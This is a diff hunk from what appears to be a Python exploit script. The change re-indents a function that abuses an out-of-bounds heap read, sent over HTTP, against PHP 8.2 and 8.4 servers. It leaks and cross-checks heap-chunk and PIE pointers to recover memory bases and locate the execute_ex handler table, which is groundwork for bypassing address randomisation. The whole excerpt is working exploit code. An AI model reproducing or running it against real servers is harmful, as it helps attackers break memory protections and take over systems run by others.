@@ -1204,37 +1204,37 @@ def leak_geometry_candidates(base_url: str, builder_url: str, version: str,
             second = _leak_read(base_url, builder_url, version, geom)
             if second is None:
                 continue
-        chunk_again, pie_again = _scan_pointers(second)
-        stable_chunk = [(off, val) for off, val in chunk_ptrs
-                        if (off, val) in chunk_again]
-        stable_pie = [(off, val) for off, val in pie_ptrs
-                      if (off, val) in pie_again]
-        if not stable_chunk or not stable_pie:
-            continue
-        chunk_off, chunk_ptr = stable_chunk[0]
-        chunk = chunk_ptr & ~(MEM_CHUNK - 1)
-        # The execute_ex handler table sits at the far end of the OOB read
-        # (0x157e8 of a 0x15810 read on 8.4 and on 8.2), while the dense
-        # runs of stale heap values sit near its start: trying the pointers
-        # from the tail first is what keeps the base search short.
-        stable_pie.sort(key=lambda item: item[0], reverse=True)
-        geometry = {
-            "arm_path": arm_path,
-            "pads": list(pads),
-            "size": size,
-            "header_content_off": hex(header),
-            "read_len": hex(LEAK_READ_LEN),
-            "chunk_ptr_off": hex(chunk_off),
-            "chunk_base_off": hex(chunk_ptr - chunk),
-            "pie_ptr_off": None,    # set once a pointer proves its base
-            "pie_base_off": None,   # ditto
-            "bases": "discovered over HTTP with the calibrate command "
-                     "(no /proc access)",
-        }
-        print(f"[+] leak geometry pads={pads} size={size} "
-              f"header=0x{header:x}: chunk_ptr_off=0x{chunk_off:x}, "
-              f"{len(stable_pie)} stable PIE-range pointers")
-        yield geometry, chunk_ptr, stable_pie
+            chunk_again, pie_again = _scan_pointers(second)
+            stable_chunk = [(off, val) for off, val in chunk_ptrs
+                            if (off, val) in chunk_again]
+            stable_pie = [(off, val) for off, val in pie_ptrs
+                          if (off, val) in pie_again]
+            if not stable_chunk or not stable_pie:
+                continue
+            chunk_off, chunk_ptr = stable_chunk[0]
+            chunk = chunk_ptr & ~(MEM_CHUNK - 1)
+            # The execute_ex handler table sits at the far end of the OOB read
+            # (0x157e8 of a 0x15810 read on 8.4 and on 8.2), while the dense
+            # runs of stale heap values sit near its start: trying the pointers
+            # from the tail first is what keeps the base search short.
+            stable_pie.sort(key=lambda item: item[0], reverse=True)
+            geometry = {
+                "arm_path": arm_path,
+                "pads": list(pads),
+                "size": size,
+                "header_content_off": hex(header),
+                "read_len": hex(LEAK_READ_LEN),
+                "chunk_ptr_off": hex(chunk_off),
+                "chunk_base_off": hex(chunk_ptr - chunk),
+                "pie_ptr_off": None,    # set once a pointer proves its base
+                "pie_base_off": None,   # ditto
+                "bases": "discovered over HTTP with the calibrate command "
+                         "(no /proc access)",
+            }
+            print(f"[+] leak geometry pads={pads} size={size} "
+                  f"header=0x{header:x}: chunk_ptr_off=0x{chunk_off:x}, "
+                  f"{len(stable_pie)} stable PIE-range pointers")
+            yield geometry, chunk_ptr, stable_pie
 
 
 def _local_bases(version: str) -> tuple[int, int]:
